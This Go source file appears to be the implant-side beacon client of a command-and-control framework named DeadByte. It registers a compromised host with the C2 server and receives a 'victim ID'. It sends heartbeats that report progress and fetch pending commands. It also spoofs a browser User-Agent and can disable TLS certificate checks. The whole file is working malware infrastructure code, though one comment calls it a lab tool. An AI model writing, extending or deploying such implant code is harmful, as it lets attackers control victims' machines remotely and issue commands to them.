// Package beacon implements the payload-side C2 client.
package beacon

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"deadbyte/internal/types"
)

// Client talks to the DeadByte C2.
type Client struct {
	URL      string
	Token    string
	Insecure bool
	HTTP     *http.Client
}

// New creates a beacon client.
func New(url, token string, insecure bool) *Client {
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: insecure}} // #nosec G402 -- lab tool, explicit flag
	return &Client{URL: url, Token: token, Insecure: insecure, HTTP: &http.Client{Transport: tr, Timeout: 20 * time.Second}}
}

func (c *Client) do(method, path string, req, resp any) error {
	var body io.Reader
	if req != nil {
		b, err := json.Marshal(req)
		if err != nil {
			return err
		}
		body = bytes.NewReader(b)
	}
	hreq, err := http.NewRequest(method, c.URL+path, body)
	if err != nil {
		return err
	}
	hreq.Header.Set("Content-Type", "application/json")
	hreq.Header.Set("User-Agent", "Mozilla/5.0 (compatible; DeadByte/"+types.Version+")")
	if c.Token != "" {
		hreq.Header.Set(types.HeaderToken, c.Token)
	}
	r, err := c.HTTP.Do(hreq)
	if err != nil {
		return err
	}
	defer r.Body.Close()
	data, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
	if err != nil {
		return err
	}
	if r.StatusCode != http.StatusOK {
		return fmt.Errorf("beacon: %s %s -> %d: %s", method, path, r.StatusCode, truncate(string(data), 200))
	}
	if resp != nil {
		return json.Unmarshal(data, resp)
	}
	return nil
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

// Register sends the initial beacon and returns the victim ID.
func (c *Client) Register(req types.BeaconReq) (types.BeaconResp, error) {
	var resp types.BeaconResp
	err := c.do(http.MethodPost, types.BeaconPath, req, &resp)
	return resp, err
}

// Heartbeat reports progress and returns pending commands.
func (c *Client) Heartbeat(h types.HeartbeatReq) ([]types.Command, error) {
	var resp types.HeartbeatResp
	err := c.do(http.MethodPost, types.HeartbeatPath, h, &resp)
	return resp.Commands, err
}
